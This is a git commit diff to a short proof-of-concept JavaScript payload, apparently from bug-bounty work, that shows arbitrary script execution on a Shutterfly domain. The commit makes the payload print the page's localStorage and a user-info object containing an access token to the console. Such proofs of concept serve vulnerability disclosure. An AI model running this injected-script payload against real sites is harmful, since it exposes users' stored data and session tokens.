edd51ac3064065b33d6cf9a86b45debe4e58a364
Khara-h1 <117389489+Khara-h1@users.noreply.github.com>
2024-01-17 12:42:29 +0100

    Update cvs1.js

--- poc/shutterfly/cvs1.js
+++ poc/shutterfly/cvs1.js
@@ -2,5 +2,7 @@ console.log(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 console.log(">>>>>> Kharaone, PoC for arbitrary JS execution on " + document.domain);
 console.log(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
 alert(document.domain);
-//console.log("Local Storage:");
-//console.log(localStorage);
+console.log("Local Storage:");
+console.log(localStorage);
+console.log("Sensitive User Data (see gs_access_token):");
+console.log(create_dynamic_user_info);
